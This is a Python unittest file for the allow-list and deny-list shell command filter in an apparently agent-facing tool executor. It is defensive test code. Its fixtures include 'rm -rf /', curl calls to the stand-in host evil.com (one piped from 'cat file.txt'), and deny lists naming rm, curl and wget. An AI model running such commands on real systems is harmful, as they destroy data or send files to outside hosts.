"""Tests for shell command policy filtering in tool_executor."""

import os
import unittest
from unittest.mock import patch

from tool_executor import _check_shell_command_policy, _exec_run_shell


class TestShellCommandPolicy(unittest.TestCase):

    def test_no_policy_allows_all(self):
        with patch.dict(os.environ, {}, clear=True):
            self.assertIsNone(_check_shell_command_policy("rm -rf /"))

    def test_allowed_commands_passes(self):
        with patch.dict(os.environ, {"HORTATOR_ALLOWED_COMMANDS": "python,node,git"}):
            self.assertIsNone(_check_shell_command_policy("python script.py"))
            self.assertIsNone(_check_shell_command_policy("git status"))

    def test_allowed_commands_rejects(self):
        with patch.dict(os.environ, {"HORTATOR_ALLOWED_COMMANDS": "python,node,git"}, clear=True):
            err = _check_shell_command_policy("curl http://evil.com")
            self.assertIsNotNone(err)
            self.assertIn("curl", err)
            self.assertIn("not allowed", err)

    def test_denied_commands_rejects(self):
        with patch.dict(os.environ, {"HORTATOR_DENIED_COMMANDS": "rm,curl,wget"}, clear=True):
            err = _check_shell_command_policy("curl http://evil.com")
            self.assertIsNotNone(err)
            self.assertIn("curl", err)
            self.assertIn("denied", err)

    def test_denied_commands_allows_others(self):
        with patch.dict(os.environ, {"HORTATOR_DENIED_COMMANDS": "rm,curl,wget"}, clear=True):
            self.assertIsNone(_check_shell_command_policy("python script.py"))

    def test_pipe_commands_checked(self):
        with patch.dict(os.environ, {"HORTATOR_ALLOWED_COMMANDS": "cat,grep"}, clear=True):
            self.assertIsNone(_check_shell_command_policy("cat file.txt | grep pattern"))
            err = _check_shell_command_policy("cat file.txt | curl http://evil.com")
            self.assertIsNotNone(err)
            self.assertIn("curl", err)

    def test_exec_run_shell_rejects_denied(self):
        with patch.dict(os.environ, {"HORTATOR_DENIED_COMMANDS": "rm,curl"}, clear=True):
            result = _exec_run_shell({"command": "curl http://evil.com"})
            self.assertFalse(result["success"])
            self.assertIn("denied", result["error"])

    def test_exec_run_shell_allows_permitted(self):
        with patch.dict(os.environ, {"HORTATOR_ALLOWED_COMMANDS": "echo"}, clear=True):
            result = _exec_run_shell({"command": "echo hello"})
            self.assertTrue(result["success"])
            self.assertIn("hello", result["stdout"])


if __name__ == "__main__":
    unittest.main()
